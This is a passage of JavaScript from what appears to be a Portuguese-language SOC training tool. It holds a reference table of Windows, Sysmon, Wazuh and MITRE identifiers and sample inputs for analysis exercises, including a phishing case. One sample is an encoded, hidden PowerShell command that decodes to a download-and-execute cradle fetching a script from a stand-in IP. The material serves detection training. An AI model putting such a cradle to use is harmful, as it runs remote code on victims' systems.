 ["Security","1102","Log de auditoria apagado: possível limpeza de rastros (T1070.001)."],
 ["System","7045","Serviço instalado (log System)."],
 ["System","7036","Serviço mudou de estado (iniciou/parou)."],
 ["PowerShell","4103","Module Logging: registra a execução de comandos e parâmetros."],
 ["PowerShell","4104","Script Block Logging: o código já decodificado. Base no Cenário 2."],
 ["Sysmon","1","Criação de processo: image, commandLine, parentImage, integrityLevel, hashes."],
 ["Sysmon","3","Conexão de rede: processo, IP e porta de destino."],
 ["Sysmon","5","Processo terminou."],
 ["Sysmon","6","Driver carregado."],
 ["Sysmon","7","Imagem (DLL) carregada."],
 ["Sysmon","8","CreateRemoteThread: thread criada em outro processo (injeção)."],
 ["Sysmon","10","ProcessAccess: um processo abriu outro (ex.: acesso ao LSASS)."],
 ["Sysmon","11","Arquivo criado."],
 ["Sysmon","12","Registro: chave ou valor criado/apagado."],
 ["Sysmon","13","Registro: valor definido (ex.: chave Run)."],
 ["Sysmon","15","FileCreateStreamHash: fluxo alternativo, como o Zone.Identifier de download."],
 ["Sysmon","17 / 18","Named pipe criado / conectado."],
 ["Sysmon","22","Consulta DNS feita por um processo."],
 ["Sysmon","23","Arquivo apagado (e arquivado pelo Sysmon)."],
 ["Sysmon","25","Process tampering: imagem do processo alterada."],
 ["Logon type","2","Interativo: no teclado da máquina."],
 ["Logon type","3","Rede: SMB, compartilhamentos. Era o tipo do brute force do Cenário 1."],
 ["Logon type","4","Batch: tarefa agendada."],
 ["Logon type","5","Serviço: services.exe iniciando serviços como SISTEMA."],
 ["Logon type","7","Desbloqueio de tela."],
 ["Logon type","8","NetworkCleartext: senha enviada em texto claro (ex.: autenticação básica)."],
 ["Logon type","9","NewCredentials: runas /netonly."],
 ["Logon type","10","RemoteInteractive: RDP."],
 ["Logon type","11","CachedInteractive: credencial em cache, sem falar com o domínio."],
 ["4625 status","0xC000006D","Falha genérica de logon; veja o subStatus."],
 ["4625 status","0xC000006A","Senha errada para um usuário que existe."],
 ["4625 status","0xC0000064","Usuário não existe."],
 ["4625 status","0xC0000234","Conta bloqueada."],
 ["4625 status","0xC0000072","Conta desabilitada."],
 ["4625 status","0xC000006F","Logon fora do horário permitido."],
 ["4625 status","0xC0000070","Logon de estação não permitida."],
 ["4625 status","0xC0000071","Senha expirada."],
 ["4625 status","0xC0000193","Conta expirada."],
 ["4625 status","0xC0000224","Usuário precisa trocar a senha no próximo logon."],
 ["Wazuh (lab)","60122","Nível 5. Uma falha de logon (4625)."],
 ["Wazuh (lab)","60204","Nível 10. Múltiplas falhas de logon (frequency 8). T1110."],
 ["Wazuh (lab)","60106","Logon com sucesso do Windows; no lab, ruído da conta SISTEMA com logonType 5."],
 ["Wazuh (lab)","92652","Nível 6. Logon remoto com sucesso via NTLM. O rótulo cita pass-the-hash; valide o contexto."],
 ["Wazuh (lab)","92057","Nível 12. PowerShell gerou outro PowerShell com comando em Base64."],
 ["Wazuh (lab)","91802","Nível 0. Base do evento 4104 (processa sem alertar)."],
 ["Wazuh (lab)","100210","Nível 4. Regra própria: alerta todo 4104 (filha da 91802)."],
 ["Wazuh (lab)","100211","Nível 0. Tuning: silencia prompt, $global:? e $Host (filha da 100210)."],
 ["Wazuh (lab)","92213","Nível 15. No lab foi falso positivo: __PSScriptPolicyTest do próprio PowerShell."],
 ["Wazuh (lab)","92058","sdbinst.exe como SYSTEM via PcaSvc, recorrente: tarefa nativa."],
 ["Wazuh (lab)","92055","FodHelper.exe; sem alteração em ms-settings ficou como provável FP."],
 ["Wazuh","Níveis","Escala de 0 a 15. Nível 0 não gera alerta. O nível prioriza, mas não decide sozinho."],
 ["MITRE","T1566.002","Phishing com link (acesso inicial do caso DETRAN)."],
 ["MITRE","T1204.001","Usuário clica no link malicioso."],
 ["MITRE","T1036","Masquerading: disfarçar algo malicioso como legítimo."],
 ["MITRE","T1656","Impersonation: se passar por uma organização (o DETRAN)."],
 ["MITRE","T1583.003","Adquirir infraestrutura: VPS (a Vultr do envio)."],
 ["MITRE","T1583.006","Adquirir infraestrutura: serviço web (o Cloud Run)."],
 ["MITRE","T1110","Brute force (Cenário 1)."],
 ["MITRE","T1110.003","Password spraying: uma senha em muitas contas."],
 ["MITRE","T1078","Contas válidas: entrar com a senha descoberta."],
 ["MITRE","T1059.001","Execução via PowerShell (Cenário 2)."],
 ["MITRE","T1027","Ofuscação (o Base64 do Cenário 2)."],
 ["MITRE","T1548.002","Bypass de UAC (o FodHelper é um caminho conhecido)."],
 ["MITRE","T1547.001","Persistência por chave Run do registro."],
 ["MITRE","T1543.003","Persistência por serviço do Windows."],
 ["MITRE","T1053.005","Tarefa agendada."],
 ["MITRE","T1136.001","Criar conta local."],
 ["MITRE","T1070.001","Apagar logs de evento do Windows."],
 ["MITRE","T1105","Ingress Tool Transfer: baixar ferramenta para a vítima."],
 ["MITRE","T1071.001","Comando e controle por protocolo web."]
];
const CATS = ["Todos", ...new Set(REF.map(r => r[0]).map(c => c.startsWith("Wazuh") ? "Wazuh" : c))];
let refCat = "Todos";
const norm = s => String(s).toLowerCase().normalize("NFD").replace(/[̀-ͯ]/g, "");
function renderRef(){
  const q = norm($("#refQ").value.trim());
  const rows = REF.filter(r => (refCat === "Todos" || r[0] === refCat || (refCat === "Wazuh" && r[0].startsWith("Wazuh"))) && (!q || norm(r.join(" ")).includes(q)));
  $("#refBody").innerHTML = rows.length ? rows.map(r => `<tr><td><span class="cat">${esc(r[0])}</span></td><td>${esc(r[1])}</td><td>${esc(r[2])}</td></tr>`).join("") : `<tr><td colspan="3">Nada encontrado.</td></tr>`;
  $("#refCats").innerHTML = "";
  CATS.forEach(c => { const b = document.createElement("button"); b.type = "button"; b.className = "chip"; b.textContent = c; b.setAttribute("aria-pressed", String(c === refCat)); b.onclick = () => { refCat = c; renderRef(); }; $("#refCats").appendChild(b); });
}
$("#refQ").addEventListener("input", renderRef); renderRef();

/* ---------- exemplos práticos ---------- */
const HDR_EX = [
    "Received: from DM6PR02MB1234.namprd02.prod.outlook.com (::1) by MW4PR02MB5678.namprd02.prod.outlook.com with HTTPS; Tue, 13 Oct 2026 14:22:11 +0000",
    "Received: from BN8NAM12FT011.eop-nam12.prod.protection.outlook.com (2603:10b6:408:e1::4) by DM6PR02MB1234.namprd02.prod.outlook.com",
    "  with Microsoft SMTP Server; Tue, 13 Oct 2026 14:22:10 +0000",
    "Received: from [127.0.1.1] (66.42.69.62) by BN8NAM12FT011.mail.protection.outlook.com (10.13.182.123)",
    "  with Microsoft SMTP Server via Frontend Transport; Tue, 13 Oct 2026 14:22:09 +0000",
    "Authentication-Results: spf=none (sender IP is 66.42.69.62) smtp.mailfrom=detran659532;",
    "  dkim=none (message not signed) header.d=none;dmarc=none action=none header.from=detran659532",
    "From: \"DETRAN - Notificacao\" <infracao@detran659532>",
    "To: vitima@exemplo.com",
    "Subject: =?UTF-8?B?Tk9USUZJQ0HDh8ODTyBPRklDSUFMIC0gUHJvdG9jb2xvIDMwODU2NTU2Ng==?=",
    "Date: Tue, 13 Oct 2026 14:22:05 +0000",
    "Message-ID: <20261013142205.4821@127.0.1.1>",
    "X-MS-Exchange-Organization-SCL: 9"
  ];
function setv(sel, v){ $(sel).value = v; }
const EX = {
  url1(){ setv("#urlIn", "hxxps://www[.]office[.]com-pt-br-notificacao@dete3-489991573399[.]southamerica-east1[.]run[.]app/"); $("#urlGo").click(); },
  url2(){ setv("#urlIn", "https://www.gov.br/pt-br/servicos"); $("#urlGo").click(); },
  hdr1(){ setv("#hdrIn", HDR_EX.join("\n")); $("#hdrGo").click(); },
  ioc1(){ setv("#iocIn", [
    '{"rule":{"id":"60204","level":10,"description":"Multiple Windows Logon Failures","mitre":{"id":["T1110"]}},',
    ' "agent":{"name":"SOC-Win11","ip":"10.0.10.20"},',
    ' "data":{"win":{"eventdata":{"ipAddress":"10.0.10.30","targetUserName":"joao.teste","subStatus":"0xc000006a"}}}}',
    "",
    "Caso phishing: remetente infracao@detran659532, IP de envio 66.42.69.62 (Vultr),",
    "URL hxxps://www[.]office[.]com-pt-br@dete3-489991573399[.]southamerica-east1[.]run[.]app/",
    "Recebido por outlook.office365.com. Mapeamento: T1566.002, T1204.001, T1036."
  ].join("\n")); $("#iocGo").click(); },
  df1(){ setv("#dfIn", "IP de envio: 66.42.69.62\nURL do golpe: https://dete3-489991573399.southamerica-east1.run.app/\nRemetente: infracao@detran659532.com"); $("#dfGo").click(); },
  ps1(){ setv("#psIn", "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcATABBAEIALQBTAE8AQwAgAEMAZQBuAGEAcgBpAG8AIAAyADoAIABjAG8AbQBhAG4AZABvACAAZABlACAAdABlAHMAdABlACcA"); $("#psGo").click(); },
  ps2(){ setv("#psIn", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAeAB4AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBhAC4AcABzADEAJwApAA=="); $("#psGo").click(); },
  async hash1(){
    const h = async t => hex(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(t)));
    let original = ""; try { original = await h("Relatório do incidente: IP 66.42.69.62 bloqueado."); } catch(e) {}
    setv("#hashCmp", original); setv("#hashIn", "Relatório do incidente: IP 66.42.69.62 bloqueadO.");
    $("#hashGo").click();
    setTimeout(() => { $("#hashOut").insertAdjacentHTML("afterbegin", `<p class="sub2">O campo "Comparar com" tem o hash do texto original (terminando em "bloqueado."). O texto acima trocou só a última letra para maiúscula.</p>`); }, 120);
  },
  tm1(){ setv("#tmIn", "Nov 14, 2026 @ 01:57:04.000"); $("#tmZone").value = "-4"; $("#tmGo").click(); },
  calc1(){ setv("#cFails", "9"); setv("#cGap", "2"); setv("#cFreq", "8"); setv("#cTf", "120"); calc(); },
  calc2(){ setv("#cFails", "9"); setv("#cGap", "60"); setv("#cFreq", "8"); setv("#cTf", "120"); calc(); },
  ref1(){ setv("#refQ", "0xC000006A"); refCat = "Todos"; renderRef(); }
};
document.querySelectorAll("[data-ex]").forEach(b => b.addEventListener("click", () => { const f = EX[b.dataset.ex]; if (f) f(); }));
})();
